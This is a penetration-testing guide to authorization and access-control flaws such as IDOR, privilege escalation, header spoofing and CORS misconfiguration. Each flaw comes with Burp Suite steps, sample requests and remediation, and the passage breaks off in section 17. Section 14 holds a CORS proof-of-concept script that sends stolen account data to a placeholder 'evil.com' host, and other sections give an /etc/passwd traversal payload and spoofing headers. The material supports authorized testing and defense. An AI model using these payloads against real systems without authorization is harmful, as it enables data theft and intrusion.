# 🔐 **AUTHORIZATION & ACCESS CONTROL TESTING MASTER GUIDE FOR VAPT**
*A Professional Penetration Tester's Comprehensive Deep Dive into Broken Access Control - The #1 King of Bugs 👑*

---

## 📋 **TABLE OF CONTENTS**

1. [Insecure Direct Object Reference (IDOR) - Horizontal Privilege Escalation](#1-insecure-direct-object-reference-idor---horizontal-privilege-escalation)
2. [IDOR in Sequential Identifiers (Numeric ID Enumeration)](#2-idor-in-sequential-identifiers-numeric-id-enumeration)
3. [IDOR in UUID/GUID Based References (Predictable UUIDs)](#3-idor-in-uuidguid-based-references-predictable-uuids)
4. [IDOR in Multi-Parameter Requests (Nested/Composite IDs)](#4-idor-in-multi-parameter-requests-nestedcomposite-ids)
5. [IDOR in File Download/Upload Functionality (Direct File Access)](#5-idor-in-file-downloadupload-functionality-direct-file-access)
6. [Vertical Privilege Escalation - Accessing Admin Functions as Regular User](#6-vertical-privilege-escalation---accessing-admin-functions-as-regular-user)
7. [Role/Privilege Manipulation via Parameter Tampering](#7-roleprivilege-manipulation-via-parameter-tampering)
8. [Hidden Administrative Endpoints Discovery (Forceful Browsing)](#8-hidden-administrative-endpoints-discovery-forceful-browsing)
9. [Missing Function Level Access Control (Unprotected APIs)](#9-missing-function-level-access-control-unprotected-apis)
10. [HTTP Method Tampering for Authorization Bypass](#10-http-method-tampering-for-authorization-bypass)
11. [Path Traversal in Authorization Checks (URL Manipulation)](#11-path-traversal-in-authorization-checks-url-manipulation)
12. [X-Original-URL / X-Rewrite-URL Header Bypass](#12-x-original-url--x-rewrite-url-header-bypass)
13. [IP/Network Based Authorization Bypass (Headers Spoofing)](#13-ipnetwork-based-authorization-bypass-headers-spoofing)
14. [CORS Misconfiguration Leading to Cross-Origin Data Theft](#14-cors-misconfiguration-leading-to-cross-origin-data-theft)
15. [Referer Header Based Authorization Bypass](#15-referer-header-based-authorization-bypass)
16. [Multi-Step Process Authorization Flaws (Workflow Bypass)](#16-multi-step-process-authorization-flaws-workflow-bypass)
17. [Mass Assignment Vulnerabilities in Authorization](#17-mass-assignment-vulnerabilities-in-authorization)
18. [JWT Authorization Bypass (Role/Privilege Tampering in Tokens)](#18-jwt-authorization-bypass-roleprivilege-tampering-in-tokens)
19. [GraphQL Authorization Bypass (Field-Level Access Control Issues)](#19-graphql-authorization-bypass-field-level-access-control-issues)
20. [Multi-Tenancy Data Leakage (Cross-Tenant Access)](#20-multi-tenancy-data-leakage-cross-tenant-access)
21. [POST → GET Method Conversion Authorization Bypass](#21-post--get-method-conversion-authorization-bypass)
22. [Parameter Pollution for Authorization Bypass](#22-parameter-pollution-for-authorization-bypass)
23. [Hidden Parameters that Control Authorization](#23-hidden-parameters-that-control-authorization)
24. [Cache-Related Authorization Flaws](#24-cache-related-authorization-flaws)
25. [Session Based Authorization Flaws (Privilege Escalation via Session Reuse)](#25-session-based-authorization-flaws-privilege-escalation-via-session-reuse)
26. [Insecure Direct Object Reference in WebSocket Messages](#26-insecure-direct-object-reference-in-websocket-messages)
27. [IDOR in API Versioning (V1 vs V2 Authorization Differences)](#27-idor-in-api-versioning-v1-vs-v2-authorization-differences)
28. [Rate Limit Bypass for Authorization Brute Force](#28-rate-limit-bypass-for-authorization-brute-force)
29. [Time-Based Authorization Flaws (Token/Privilege Not Expiring)](#29-time-based-authorization-flaws-tokenprivilege-not-expiring)
30. [Business Logic Authorization Bypass (Function Chaining)](#30-business-logic-authorization-bypass-function-chaining)

---

## 1. INSECURE DIRECT OBJECT REFERENCE (IDOR) - HORIZONTAL PRIVILEGE ESCALATION

**Description**  
IDOR vulnerabilities occur when an application exposes a reference to an internal implementation object, such as a file, database record, or directory, and fails to verify whether the user is authorized to access that specific object . Attackers can manipulate these references to access other users' data without authorization. This is the most common and critical authorization flaw.

**What to Look For**
- Object references in URLs, query parameters, or POST bodies: `/user/123`, `?id=123`, `{ "user_id": 123 }`
- Sequential or predictable identifiers (numeric IDs, base64 encoded values)
- API endpoints that return data based on user-supplied IDs
- File download endpoints that take filenames or paths as parameters
- References in hidden form fields, cookies, or session variables

**What to Ignore**
- Random, non-predictable identifiers (cryptographic UUIDs) - but still test!
- Parameters that are not used to access objects directly

**How to Test with Burp Suite **

1. **Identify Potential IDOR Parameters:**
   - Log in with User A and browse the application
   - Note all requests containing parameters like `id`, `user_id`, `account`, `file`, `document`, `order`, `invoice`
   - Send interesting requests to Burp Repeater

2. **Create Test Accounts:**
   - Create two user accounts with identical privileges: User A and User B 
   - Note User B's object IDs (e.g., profile ID, order ID)

3. **Test Parameter Manipulation:**
   - In Repeater, modify the ID parameter from User A's value to User B's value
   - Example: Change `/api/user/123` to `/api/user/124`
   - Send the request and examine the response

4. **Use Burp Intruder for Mass Testing:**
   - Send the request to Intruder
   - Set payload position on the ID parameter
   - Add a list of potential IDs (sequential numbers, usernames, etc.)
   - Run Sniper attack and look for responses with different lengths or status codes 

5. **Automate with Autorize Extension:**
   - Install Autorize extension
   - Capture User B's session cookie
   - Set Autorize to use User B's cookie as "unauthorized" session
   - Browse as User A; Autorize automatically replays requests with User B's cookie to detect IDORs

**Example**
```http
GET /api/user/profile?user_id=123 HTTP/1.1
Host: target.com
Cookie: session=USER_A_SESSION
```
Change to:
```http
GET /api/user/profile?user_id=124 HTTP/1.1
Host: target.com
Cookie: session=USER_A_SESSION
```
If response contains User B's data, IDOR is present.

**Tools**
- Burp Suite Repeater, Intruder, Sequencer
- Autorize (Burp extension)
- AuthMatrix (Burp extension)
- ZAP Access Control Testing add-on

**Risk Rating**  
High to Critical (depends on data exposed)

**Remediation**
- Implement proper access control checks on every request
- Use indirect references (maps) instead of direct object references
- Verify user ownership before granting access
- Use random, unguessable identifiers (UUID v4) 
- Implement role-based access control (RBAC)

---

## 2. IDOR IN SEQUENTIAL IDENTIFIERS (NUMERIC ID ENUMERATION)

**Description**  
This is a specific type of IDOR where the application uses sequential numeric identifiers (e.g., 1001, 1002, 1003) to reference objects. Attackers can easily enumerate these IDs to discover and access other users' data.

**What to Look For**
- URLs like `/order/12345`, `/invoice/1001`, `/user/42`
- Auto-incrementing database primary keys exposed in requests
- No randomness or unpredictability in identifiers

**What to Ignore**
- Non-sequential identifiers (UUIDs, hashed values)
- IDs that are not exposed directly

**How to Test with Burp Suite**

1. **Capture a Request with Numeric ID:**
   ```
   GET /order/details?id=12345 HTTP/1.1
   ```

2. **Send to Intruder:**
   - Set payload position on the numeric ID
   - Choose "Numbers" payload type
   - Configure range (e.g., 12300 to 12400)

3. **Analyze Responses:**
   - Look for 200 OK responses vs 403/404
   - Compare response lengths
   - Check for different content indicating different user data

4. **Manual Testing:**
   - Try `id=12344`, `id=12346`, `id=1`, `id=0`, `id=-1`
   - Note which IDs return data

**Example**
```http
GET /api/orders/12345 HTTP/1.1
Cookie: session=USER_A_SESSION

GET /api/orders/12346 HTTP/1.1
Cookie: session=USER_A_SESSION
```
If both return order details, attacker can enumerate all orders.

**Tools**
- Burp Intruder (Numbers payload)
- WFuzz
- Custom Python scripts

**Risk Rating**  
High

**Remediation**
- Use non-sequential, unpredictable identifiers (UUID v4)
- Implement proper authorization checks regardless of ID type
- Rate limit requests to prevent enumeration
- Consider indirect reference maps

---

## 3. IDOR IN UUID/GUID BASED REFERENCES (PREDICTABLE UUIDs)

**Description**  
Many developers assume UUIDs are inherently secure. However, if UUIDs are generated using predictable algorithms (e.g., v1 UUIDs based on timestamp and MAC address), or if they are exposed and can be guessed, IDOR vulnerabilities may still exist .

**What to Look For**
- UUIDs in URLs: `/user/550e8400-e29b-41d4-a716-446655440000`
- UUID v1 format (includes timestamp) - potentially predictable
- UUIDs that are sequential or follow a pattern
- UUIDs exposed in client-side code (JavaScript, HTML comments)

**What to Ignore**
- Cryptographically random UUIDs (v4) with sufficient entropy
- Properly validated UUIDs with access controls

**How to Test with Burp Suite**

1. **Analyze UUID Generation:**
   - Collect multiple UUIDs from the application (create multiple resources)
   - Use online tools or Burp Sequencer to analyze patterns
   - Check if they are v1 (timestamp-based) or v4 (random)

2. **Identify UUID Version:**
   - UUID version is indicated by the 13th character (e.g., `4` for v4, `1` for v1)
   - v1 UUIDs contain timestamp information that may be predictable

3. **Attempt Enumeration:**
   - If v1 UUIDs, the timestamp portion may allow limited prediction
   - Use Burp Intruder with custom payload generation
   - Try UUIDs of other users if pattern is observed

4. **Check for UUID Exposure:**
   - Search JavaScript files for hardcoded UUIDs
   - Check if UUIDs are exposed in HTML comments or hidden fields

**Example**
```http
GET /api/user/550e8400-e29b-41d4-a716-446655440000 HTTP/1.1
Cookie: session=USER_A_SESSION
```
If UUID is v1, attacker might predict other users' UUIDs based on timestamp.

**Tools**
- Burp Sequencer
- uuid-validator (online)
- Custom scripts for UUID analysis

**Risk Rating**  
Medium to High

**Remediation**
- Use cryptographically secure random UUIDs (v4)
- Never rely on UUID secrecy for authorization
- Always implement proper access controls regardless of identifier type
- Consider using hash-based message authentication codes (HMAC) for references

---

## 4. IDOR IN MULTI-PARAMETER REQUESTS (NESTED/COMPOSITE IDS)

**Description**  
Sometimes object references are spread across multiple parameters or nested in complex data structures. Attackers must manipulate multiple values simultaneously to exploit IDOR vulnerabilities.

**What to Look For**
- Requests with multiple ID parameters: `?user_id=123&order_id=456`
- Nested JSON objects: `{ "user": { "id": 123 }, "order": { "id": 456 } }`
- Composite keys where multiple values define the resource
- Hierarchical relationships (e.g., company ID + department ID + employee ID)

**What to Ignore**
- Simple single-parameter references (covered above)

**How to Test with Burp Suite**

1. **Map Resource Hierarchies:**
   - Understand the relationship between objects
   - Example: Company → Department → Employee
   - Note all parameters that identify these objects

2. **Test Individual Parameter Manipulation:**
   - Change each ID parameter individually while keeping others constant
   - Example: Keep `company_id=1`, change `department_id=2` to `3`

3. **Test Cross-Hierarchy Access:**
   - Try to access objects from different hierarchies
   - Example: `company_id=1&department_id=5` where department 5 belongs to company 2

4. **Use Burp Intruder with Multiple Payload Positions:**
   - Set multiple payload positions (e.g., for both user_id and order_id)
   - Use Cluster Bomb attack to test combinations

**Example**
```http
POST /api/employee/details HTTP/1.1
Content-Type: application/json

{
  "company_id": 1,
  "department_id": 2,
  "employee_id": 123
}
```
Try:
```json
{
  "company_id": 1,
  "department_id": 2,
  "employee_id": 124
}
```
Then:
```json
{
  "company_id": 1,
  "department_id": 3,
  "employee_id": 123
}
```
If any combination returns other users' data, IDOR exists.

**Tools**
- Burp Intruder (Cluster Bomb)
- Custom scripts
- Postman for manual testing

**Risk Rating**  
High

**Remediation**
- Implement access control checks at each level of hierarchy
- Validate that all object references belong to the authenticated user
- Use session-based context rather than client-supplied parameters where possible

---

## 5. IDOR IN FILE DOWNLOAD/UPLOAD FUNCTIONALITY (DIRECT FILE ACCESS)

**Description**  
File download and upload functionality is particularly vulnerable to IDOR attacks. Attackers can manipulate file paths, names, or identifiers to access other users' files or system files .

**What to Look For**
- File download endpoints: `/download?file=invoice_123.pdf`
- File access URLs: `/uploads/user_123/profile.jpg`
- File identifiers: `/api/files/9876`
- Path parameters: `/files?path=/user/123/document.pdf`

**What to Ignore**
- Files served with proper access controls and temporary signed URLs

**How to Test with Burp Suite**

1. **Identify File Access Patterns:**
   - Upload a file as User A
   - Note the file URL or download request

2. **Test File ID Manipulation:**
   - Change file ID to other users' file IDs
   - Example: `/download?file=invoice_123.pdf` → `/download?file=invoice_124.pdf`

3. **Test Path Traversal:**
   - Attempt to access files outside the intended directory
   - Example: `/download?file=../../../etc/passwd`

4. **Test File Name Enumeration:**
   - If file names follow patterns (e.g., `user123_doc.pdf`), try variations
   - Use Burp Intruder with filename patterns

5. **Check for Direct Directory Access:**
   - Try accessing the upload directory directly: `/uploads/`
   - Check if directory listing is enabled

**Example **
```http
GET /uploads/user_123/resume.pdf HTTP/1.1
Cookie: session=USER_A_SESSION
```
Try:
```http
GET /uploads/user_124/resume.pdf HTTP/1.1
Cookie: session=USER_A_SESSION
```
If accessible, user can view other users' resumes.

**Tools**
- Burp Repeater
- Burp Intruder
- Dirb/Gobuster for directory enumeration

**Risk Rating**  
High to Critical

**Remediation**
- Store files outside the webroot with access controlled by application logic
- Use indirect file references (database mapping)
- Implement proper authorization checks before serving files
- Use signed, time-limited URLs for file access
- Disable directory listing

---

## 6. VERTICAL PRIVILEGE ESCALATION - ACCESSING ADMIN FUNCTIONS AS REGULAR USER

**Description**  
Vertical privilege escalation occurs when a user with lower privileges (e.g., regular user) can access functions or data reserved for higher-privileged users (e.g., administrators) . This is often more critical than horizontal escalation as it can lead to full system compromise.

**What to Look For**
- Administrative panels and functions: `/admin`, `/dashboard`, `/manage`
- API endpoints for privileged operations: `/api/admin/users`, `/api/deleteUser`
- Hidden or obfuscated admin interfaces
- Functions that should be restricted by role

**What to Ignore**
- Publicly accessible pages that don't expose sensitive functionality

**How to Test with Burp Suite **

1. **Map Admin Functions:**
   - Log in as an administrator user (if available)
   - Browse all administrative functions
   - Note all URLs, parameters, and request patterns
   - Use Burp Spider or manual browsing

2. **Switch to Low-Privilege User:**
   - Log in as a regular user
   - Attempt to access each admin URL directly

3. **Test API Endpoints:**
   - Capture admin API requests
   - Replay them with regular user's session cookie
   - Use Repeater to send exact same requests

4. **Use Autorize Extension:**
   - Configure Autorize with high-privilege session as reference
   - Browse as low-privilege user; Autorize detects if privileged endpoints are accessible

5. **Test for Role Parameter Manipulation:**
   - Add parameters like `role=admin`, `isAdmin=true` to requests

**Example **
Admin request:
```http
POST /admin/deleteUser HTTP/1.1
Cookie: session=ADMIN_SESSION

userID=123
```
Low-privilege user attempt:
```http
POST /admin/deleteUser HTTP/1.1
Cookie: session=USER_SESSION

userID=123
```
If successful, vertical privilege escalation exists.

**Tools**
- Burp Suite (Repeater, Intruder, Proxy)
- Autorize extension
- AuthMatrix extension

**Risk Rating**  
Critical

**Remediation**
- Implement role-based access control (RBAC) on all administrative functions
- Never rely on UI hiding for security; enforce checks server-side
- Use middleware/filters to verify role before processing requests
- Regularly audit access control matrices 

---

## 7. ROLE/PRIVILEGE MANIPULATION VIA PARAMETER TAMPERING

**Description**  
Some applications determine user roles and privileges based on client-supplied parameters. Attackers can modify these parameters to escalate their privileges .

**What to Look For**
- Parameters like `role`, `isAdmin`, `user_type`, `permissions`, `group`
- Hidden form fields containing role information
- Cookies or session variables that define privileges
- JSON/XML structures with privilege fields

**What to Ignore**
- Server-side session-based role determination (cannot be manipulated client-side)

**How to Test with Burp Suite**

1. **Identify Role-Related Parameters:**
   - Intercept requests during login, profile updates, or any action
   - Look for parameters that might define user roles

2. **Add/Modify Role Parameters:**
   - Try adding `&role=admin` to requests
   - Change `isAdmin=false` to `isAdmin=true`
   - Modify `user_type=user` to `user_type=administrator`

3. **Test in Different Contexts:**
   - During registration: try to register as admin
   - During profile update: try to change role
   - In API requests: add privilege parameters

4. **Check for Mass Assignment:**
   - If the application uses frameworks vulnerable to mass assignment, extra parameters may be accepted

**Example **
```http
POST /api/user/update-profile HTTP/1.1
Cookie: session=USER_SESSION
Content-Type: application/json

{
  "name": "John Doe",
  "email": "john@example.com"
}
```
Try adding:
```json
{
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin"
}
```
If user becomes admin, vulnerable to parameter tampering.

**Tools**
- Burp Repeater
- Param Miner extension
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Never rely on client-side parameters for authorization decisions
- Store user roles and privileges server-side in session
- Use server-side validation for all role-related operations
- Protect against mass assignment vulnerabilities

---

## 8. HIDDEN ADMINISTRATIVE ENDPOINTS DISCOVERY (FORCEFUL BROWSING)

**Description**  
Many applications have administrative interfaces or privileged functions that are not linked from the main UI but are still accessible if the URL is known. Attackers can discover these through forced browsing .

**What to Look For**
- Common admin paths: `/admin`, `/administrator`, `/backend`, `/dashboard`
- Admin panel paths: `/admin.php`, `/admin/login`, `/cp`, `/controlpanel`
- Debug/development endpoints: `/test`, `/dev`, `/phpinfo`, `/debug`
- API documentation: `/swagger`, `/api-docs`, `/graphql`, `/graphiql`

**What to Ignore**
- Publicly accessible pages with no sensitive functionality

**How to Test with Tools**

1. **Directory/File Enumeration:**
   ```
   gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   ffuf -u https://target.com/FUZZ -w common_admin_paths.txt
   dirb https://target.com
   ```

2. **Common Admin Paths to Check:**
   ```
   /admin
   /administrator
   /backend
   /dashboard
   /manage
   /control
   /adminpanel
   /sysadmin
   /dev
   /test
   /phpinfo
   /info
   /status
   /debug
   ```

3. **Check for API Documentation:**
   ```
   /swagger
   /swagger-ui
   /api-docs
   /graphql
   /graphiql
   /playground
   /redoc
   ```

4. **Test Access as Unprivileged User:**
   - Discover admin paths using enumeration tools
   - Attempt to access them with a regular user session
   - If page loads or returns data, it's a forceful browsing vulnerability 

**Example **
```http
GET /admin/addUser HTTP/1.1
Cookie: session=USER_SESSION
```
If this returns admin functionality, the application is vulnerable.

**Tools**
- Dirb
- Gobuster
- FFUF
- Dirsearch
- Burp Intruder with path wordlists

**Risk Rating**  
High

**Remediation**
- Implement proper access controls on all endpoints, not just hidden ones
- Use consistent authorization checks across all functions
- Remove or secure development/debug endpoints in production
- Implement IP whitelisting for admin interfaces where possible

---

## 9. MISSING FUNCTION LEVEL ACCESS CONTROL (UNPROTECTED APIS)

**Description**  
Sometimes developers protect the UI but forget to protect the underlying API endpoints. Users may not see admin buttons, but can still call admin APIs directly .

**What to Look For**
- API endpoints that perform privileged operations
- No authentication/authorization checks on API calls
- Client-side only hiding of UI elements
- Different authorization levels for web vs mobile APIs

**What to Ignore**
- APIs with proper authentication and role checks

**How to Test with Burp Suite**

1. **Map All API Endpoints:**
   - Use Burp Spider or manually browse with proxy
   - Analyze JavaScript files for hidden API endpoints
   - Look for patterns like `/api/v1/admin/*`

2. **Capture Privileged Requests:**
   - Log in as admin and perform privileged actions
   - Note all API requests made

3. **Replay with Regular User:**
   - In Repeater, replace admin session cookie with regular user's cookie
   - Send the request and observe response

4. **Test for Missing Authorization Headers:**
   - Remove authorization headers/tokens
   - See if API still returns data

5. **Test Different HTTP Methods:**
   - If GET is protected, try POST or PUT
   - Example: `GET /api/admin/users` may be blocked, but `POST /api/admin/users` might work

**Example**
Admin request:
```http
DELETE /api/admin/users/123 HTTP/1.1
Authorization: Bearer ADMIN_TOKEN
```
Regular user attempt:
```http
DELETE /api/admin/users/123 HTTP/1.1
Authorization: Bearer USER_TOKEN
```
If successful, function-level access control is missing.

**Tools**
- Burp Repeater
- Postman
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Implement consistent authorization checks on all API endpoints
- Use middleware/filters to enforce access control
- Never rely on UI hiding for security
- Regular API security testing 

---

## 10. HTTP METHOD TAMPERING FOR AUTHORIZATION BYPASS

**Description**  
Some applications only check authorization for specific HTTP methods (e.g., POST) but not for others (e.g., GET, PUT, DELETE). Attackers can change the HTTP method to bypass authorization checks .

**What to Look For**
- Sensitive operations that should require specific methods
- Different authorization logic for different HTTP methods
- APIs that accept multiple methods

**What to Ignore**
- Consistent authorization across all HTTP methods

**How to Test with Burp Suite**

1. **Identify Sensitive Operations:**
   - Find actions that modify data (create, update, delete)
   - Note the HTTP method used (usually POST, PUT, DELETE)

2. **Try Alternative Methods:**
   - Change POST to GET (add parameters to URL if needed)
   - Change GET to POST
   - Try HEAD, OPTIONS, PATCH

3. **Test Method Manipulation:**
   ```
   POST /api/deleteUser HTTP/1.1  →  GET /api/deleteUser?userID=123
   ```
   ```
   PUT /api/updateProfile HTTP/1.1  →  POST /api/updateProfile
   ```

4. **Check for Method Override Headers:**
   - Try adding headers like `X-HTTP-Method-Override: PUT`
   - Some frameworks support method override via headers

**Example**
```http
POST /api/transfer HTTP/1.1
Cookie: session=USER_SESSION
Content-Type: application/x-www-form-urlencoded

amount=1000&to=123
```
Try:
```http
GET /api/transfer?amount=1000&to=123 HTTP/1.1
Cookie: session=USER_SESSION
```
If the transfer still executes, authorization is method-dependent.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Implement consistent authorization checks regardless of HTTP method
- Follow REST best practices (GET for read, POST for create, etc.)
- Validate HTTP method on server-side
- Disable unnecessary HTTP methods

---

## 11. PATH TRAVERSAL IN AUTHORIZATION CHECKS (URL MANIPULATION)

**Description**  
Sometimes applications make authorization decisions based on the URL path. Attackers can use path traversal techniques (e.g., `../`, `//`, `%2e%2e%2f`) to bypass these checks and access restricted resources .

**What to Look For**
- Applications that check URL patterns for authorization
- Path traversal sequences accepted in URLs
- URL normalization differences between components

**What to Ignore**
- Properly normalized URLs with consistent authorization

**How to Test with Burp Suite**

1. **Identify Protected Paths:**
   - Find paths that should be restricted (e.g., `/admin`, `/internal`)

2. **Attempt Path Traversal:**
   ```
   /admin/users  →  /./admin/users
   /admin/users  →  //admin//users
   /admin/users  →  /a/../admin/users
   /admin/users  →  /admin/./users
   ```

3. **Use URL Encoding:**
   ```
   /admin/users  →  /%61dmin/users  (hex encoding)
   /admin/users  →  /%2561dmin/users  (double encoding)
   /admin/users  →  /admin%2fusers  (encoded slash)
   ```

4. **Test Path Traversal to Bypass Authorization :**
   ```
   GET /admin/users HTTP/1.1  →  Blocked
   GET /a/../admin/users HTTP/1.1  →  May be allowed
   ```

**Example **
In GoAnywhere vulnerability (CVE-2024-0204), the security filter blocked access to `/wizard/InitialAccountSetup.xhtml` by exact path matching. However, accessing `/a/../wizard/InitialAccountSetup.xhtml` bypassed the filter because the path was normalized differently, allowing pre-auth admin account creation.

**Tools**
- Burp Repeater
- Custom scripts with encoding variations

**Risk Rating**  
Critical

**Remediation**
- Normalize URLs before making authorization decisions
- Use canonical paths for access control
- Be consistent in URL handling across all components
- Avoid relying on exact path matching for security

---

## 12. X-ORIGINAL-URL / X-REWRITE-URL HEADER BYPASS

**Description**  
Some applications, especially those behind reverse proxies, support headers like `X-Original-URL` or `X-Rewrite-URL` to override the effective request URL. Attackers can use these headers to bypass front-end access controls .

**What to Look For**
- Support for `X-Original-URL` or `X-Rewrite-URL` headers
- Application behind reverse proxy (e.g., Apache mod_proxy, Nginx)
- Front-end access controls that can be bypassed

**What to Ignore**
- Applications that don't support these headers

**How to Test with Burp Suite **

1. **Detect Header Support:**
   ```
   GET / HTTP/1.1
   Host: target.com
   X-Original-URL: /donotexist1
   ```
   ```
   GET / HTTP/1.1
   Host: target.com
   X-Rewrite-URL: /donotexist2
   ```

   If response contains 404 or "not found" messages, the header is supported.

2. **Attempt Bypass:**
   - Identify a restricted path (e.g., `/admin`)
   - Send request to a public path (e.g., `/`) but specify restricted path in header:
   ```
   GET / HTTP/1.1
   Host: target.com
   X-Original-URL: /admin
   ```

3. **Test Both Headers:**
   - Try both `X-Original-URL` and `X-Rewrite-URL`
   - Some applications support one but not the other

**Example **
Front-end blocks access to `/admin`:
```http
GET /admin HTTP/1.1
Host: target.com
```
→ 403 Forbidden

Bypass attempt:
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
```
If admin panel loads, bypass is successful.

**Tools**
- Burp Repeater
- Custom headers in any HTTP client

**Risk Rating**  
High

**Remediation**
- Disable support for these headers if not needed
- Configure reverse proxies to strip such headers
- Implement consistent authorization at application level, not just front-end

---

## 13. IP/NETWORK BASED AUTHORIZATION BYPASS (HEADERS SPOOFING)

**Description**  
Some applications restrict access based on IP address (e.g., admin panels only accessible from internal networks). Attackers can spoof IP-related headers to bypass these restrictions .

**What to Look For**
- Access controls based on IP address
- Admin panels or internal-only functions
- Support for proxy headers like `X-Forwarded-For`

**What to Ignore**
- Properly configured network-level access controls

**How to Test with Burp Suite **

1. **Identify IP-Restricted Areas:**
   - Find pages that return 403 or redirect when accessed externally

2. **Test Common Spoofing Headers:**
   ```
   X-Forwarded-For: 127.0.0.1
   X-Forward-For: 127.0.0.1
   X-Remote-IP: 127.0.0.1
   X-Originating-IP: 127.0.0.1
   X-Remote-Addr: 127.0.0.1
   X-Client-IP: 127.0.0.1
   ```

3. **Try Different IP Values :**
   - Localhost: `127.0.0.1`, `::1`, `localhost`
   - RFC1918 addresses: `10.0.0.1`, `192.168.1.1`, `172.16.0.1`
   - Link local: `169.254.0.1`

4. **Include Port Numbers :**
   - Sometimes including port helps bypass protections: `127.0.0.1:80`

**Example **
```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
```
If admin panel loads, IP-based restriction is bypassed.

**Tools**
- Burp Repeater
- Custom header injection

**Risk Rating**  
Medium to High

**Remediation**
- Don't rely solely on IP-based authentication for sensitive functions
- Use VPN or jump hosts for internal access
- Configure reverse proxies to strip these headers
- Implement strong authentication regardless of source IP

---

## 14. CORS MISCONFIGURATION LEADING TO CROSS-ORIGIN DATA THEFT

**Description**  
CORS (Cross-Origin Resource Sharing) misconfigurations can allow attackers to read sensitive data from authenticated users' sessions by making cross-origin requests from malicious sites .

**What to Look For**
- `Access-Control-Allow-Origin: *` (wildcard) with `Access-Control-Allow-Credentials: true`
- Dynamic origin reflection (echoing any `Origin` header)
- Sensitive endpoints that return user data
- No validation of trusted origins

**What to Ignore**
- Properly configured CORS with allowlist and no credentials for wildcard

**How to Test with Burp Suite **

1. **Identify Sensitive Endpoints:**
   - Find endpoints that return user-specific data (e.g., `/accountDetails`, `/api/user/profile`)

2. **Test for Origin Reflection:**
   - Send request with custom `Origin` header:
   ```
   GET /accountDetails HTTP/1.1
   Host: target.com
   Origin: https://evil.com
   Cookie: session=VALID_SESSION
   ```
   - Check if response includes:
   ```
   Access-Control-Allow-Origin: https://evil.com
   Access-Control-Allow-Credentials: true
   ```

3. **Verify Credentials Flag:**
   - If both headers are present and origin is reflected, it's vulnerable

4. **Create Exploit PoC :**
   ```html
   <script>
     const xhr = new XMLHttpRequest();
     xhr.open('GET', 'https://target.com/accountDetails', true);
     xhr.withCredentials = true;
     xhr.onload = function() {
       fetch('https://evil.com/steal?data=' + encodeURIComponent(xhr.responseText));
     };
     xhr.send();
   </script>
   ```

**Example **
Response showing vulnerable configuration:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"username": "admin", "apiKey": "secret123"}
```

**Tools**
- Burp Repeater
- Burp Scanner (passive CORS checks)
- CORS Misconfiguration Scanner (Burp extension)

**Risk Rating**  
High

**Remediation**
- Never use `Access-Control-Allow-Origin: *` with credentials 
- Validate origins against a strict allowlist
- Avoid reflecting arbitrary origins
- Use `SameSite` cookie attributes

---

## 15. REFERER HEADER BASED AUTHORIZATION BYPASS

**Description**  
Some applications use the `Referer` header to make authorization decisions, assuming requests from certain pages are legitimate. Attackers can spoof the Referer header to bypass these checks.

**What to Look For**
- Authorization logic that checks the `Referer` header
- Requests rejected if Referer is missing or from wrong domain
- CSRF-like protections that rely on Referer

**What to Ignore**
- Proper CSRF tokens or other robust protections

**How to Test with Burp Suite**

1. **Identify Referer-Dependent Operations:**
   - Perform a sensitive action and note the required Referer
   - Remove Referer header and see if request is rejected

2. **Test Referer Spoofing:**
   - Try with different Referer values:
   ```
   Referer: https://target.com/expected-page
   Referer: https://evil.com
   Referer: (empty)
   ```

3. **Bypass Weak Referer Checks:**
   - If only domain is checked, try subdomains: `Referer: https://evil.com.target.com`
   - If exact match required, try path variations: `Referer: https://target.com/expected-page/../admin`

**Example**
```http
POST /admin/deleteUser HTTP/1.1
Host: target.com
Referer: https://target.com/admin/dashboard
Cookie: session=USER_SESSION
```
If request works without Referer or with spoofed Referer, authorization is flawed.

**Tools**
- Burp Repeater
- Custom header manipulation

**Risk Rating**  
Medium

**Remediation**
- Never rely on Referer header for security decisions
- Use proper CSRF tokens instead
- Implement consistent authorization checks independent of request headers

---

## 16. MULTI-STEP PROCESS AUTHORIZATION FLAWS (WORKFLOW BYPASS)

**Description**  
Complex workflows (e.g., checkout, registration, approval processes) may have authorization checks at some steps but not others. Attackers can skip steps or access later steps directly .

**What to Look For**
- Multi-page forms or wizards
- Approval workflows with multiple stages
- Processes with different authorization levels per step
- Direct access to later steps via URL manipulation

**What to Ignore**
- Consistent authorization checks throughout the entire workflow

**How to Test with Burp Suite**

1. **Map the Complete Workflow:**
   - Step 1: `/checkout/address`
   - Step 2: `/checkout/payment`
   - Step 3: `/checkout/review`
   - Step 4: `/checkout/confirm`

2. **Test Step Skipping:**
   - Try to directly access Step 4 without completing Steps 1-3
   - Example: `GET /checkout/confirm`

3. **Test Re-ordering:**
   - Access steps in different order
   - Complete Step 3, then go back to Step 1

4. **Test with Different User Roles:**
   - Start workflow as User A, complete part, then try to continue as User B

5. **Check Authorization at Each Step:**
   - Verify that each step has proper authorization checks
   - Some applications check at first step only

**Example **
E-commerce checkout:
- Step 1: Enter address (no payment info)
- Step 2: Enter payment details
- Step 3: Confirm order

If user can directly access `/order/confirm` without payment, workflow authorization is flawed.

**Tools**
- Burp Proxy
- Manual navigation
- Custom scripts for workflow automation

**Risk Rating**  
High

**Remediation**
- Implement authorization checks at every step of the workflow
- Maintain workflow state server-side, not just client-side
- Validate that all prerequisites are met before processing final step

---

## 17. MASS ASSIGNMENT VULNERABILITIES IN AUTHORIZATION

**Description**  
Mass assignment occurs when an application automatically binds user-supplied input to internal objects or database fields. Attackers can add extra parameters to modify fields they shouldn't have access to, including authorization-related fields .

**What to Look For**
- Frameworks that automatically bind request parameters to models
- `create()` or `update()` methods that accept entire request objects
- Missing `$fillable` or `$guarded` properties in models
- API endpoints that accept JSON/XML and bind to objects

**What to Ignore**
- Models with properly defined fillable fields
- Explicit validation and mapping of input

**How to Test with Burp Suite**

1. **Identify Mass Assignment Points:**
   - Look for endpoints that create or update resources
   - Common patterns: `POST /api/users`, `PUT /api/profile`

2. **Add Extra Parameters:**
   - Include parameters that shouldn't be modifiable:
   ```
   POST /api/users HTTP/1.1
   Content-Type: application/json

   {
